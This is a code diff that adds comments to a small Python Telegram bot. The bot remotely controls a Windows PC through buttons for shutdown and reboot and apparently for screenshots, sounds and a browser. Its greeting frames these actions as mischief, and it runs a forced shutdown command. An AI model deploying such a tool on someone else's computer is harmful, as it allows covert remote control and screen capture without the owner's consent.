@@ -1,3 +1,5 @@
+#import directories
+
 import telebot
 from telebot import types
 import os
@@ -5,14 +7,22 @@ from pyautogui import screenshot
 from playsound import playsound
 import webbrowser
 
+#bot token
 
 bot =telebot.TeleBot("")
+
+#some files
+
 my_screenshot =open("", encoding="")
 sound_file =""
+
+#main function for command /start
 
 @bot.message_handler(commands=["start"])
 def main(message):
 
+    #append buttons
+    
     markup = types.ReplyKeyboardMarkup()
     button_1 = types.KeyboardButton("Завершение работы")
     button_2= types.KeyboardButton("Перезагрузка")
@@ -27,6 +37,9 @@ def main(message):
 
     bot.send_message(message.chat.id,f" Привет, {message.from_user.first_name} .Выбери действие,чтобы сегодня пошалить",reply_markup=markup)
     bot.register_next_step_handler(message,on_click)
+
+#function for click logic
+
 def on_click(message):
      if message.text =="Завершение работы":
          os.system("shutdown /s /t 1")
